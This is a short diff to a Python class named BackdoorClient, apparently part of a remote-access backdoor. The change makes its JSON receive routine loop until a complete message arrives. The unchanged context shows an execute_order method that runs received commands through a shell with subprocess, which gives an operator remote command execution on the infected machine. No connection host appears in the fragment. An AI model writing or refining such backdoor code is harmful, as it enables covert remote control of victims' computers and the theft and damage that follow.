@@ -20,9 +20,14 @@ class BackdoorClient:
         self.connection.send(json_data)
     
     def json_recieve(self):
-        json_data = self.connection.recv(1024).decode()
-        return json.loads(json_data)
-
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
+    
     def execute_order(self, command):
         return subprocess.check_output(command, shell=True).decode('utf-8')
     
